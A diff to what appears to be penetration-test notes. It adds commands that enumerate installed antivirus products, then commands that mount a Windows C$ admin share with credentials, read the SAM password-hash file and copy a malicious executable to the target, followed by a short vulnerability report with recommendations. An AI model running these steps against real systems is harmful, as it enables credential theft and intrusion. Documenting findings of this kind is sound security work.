@@ -1,5 +1,31 @@
-Get-Service | Where-Object { $_.DisplayName -match "antivirus" -or $_.DisplayName -match "security" } | Select-Object DisplayName, Status
-Get-Service | Where-Object { $_.DisplayName -match "antivirus" -or $_.DisplayName -match "security" } | Select-Object DisplayName, Status
-Get-ChildItem -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" | ForEach-Object { Get-ItemProperty $_.PSPath } | Where-Object { $_.DisplayName -match "antivirus" -or $_.DisplayName -match "security" } | Select-Object DisplayName, Publisher, Version
-sc query | findstr /i "antivirus"
-wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState
+Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+Get-WmiObject -Namespace root\SecurityCenter2 -Class AntivirusProduct
+Get-MpComputerStatus
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName
+
+
+
+net view \\target_ip
+net use Z: \\target_ip\C$ /user:username password
+type Z:\Windows\System32\config\SAM
+copy malicious_file.exe Z:\Temp\
+
+# Vulnerability Report
+
+## Summary
+Default hidden shares on Windows servers were found to be accessible, leading to potential unauthorized access to sensitive information and system compromise.
+
+## Impact
+1. **Sensitive Information Exposure**: Access to hidden shares allowed the reading of sensitive files such as password hashes.
+2. **Remote Code Execution**: Malicious files could be uploaded and executed on the target system.
+3. **System Disruption**: System files could be modified, leading to potential service disruptions.
+
+## Recommendations
+1. **Disable Unnecessary Shares**: Disable all default hidden shares that are not required.
+2. **Restrict Access**: Limit access to administrative shares to only authorized users and systems.
+3. **Monitor Access**: Implement monitoring and alerting for access to sensitive shares.
+
+## Proof of Concept
+- Accessed `C$` share using `net use`.
+- Read `SAM` file containing password hashes.
+- Uploaded and executed a malicious file in the `Temp` directory.
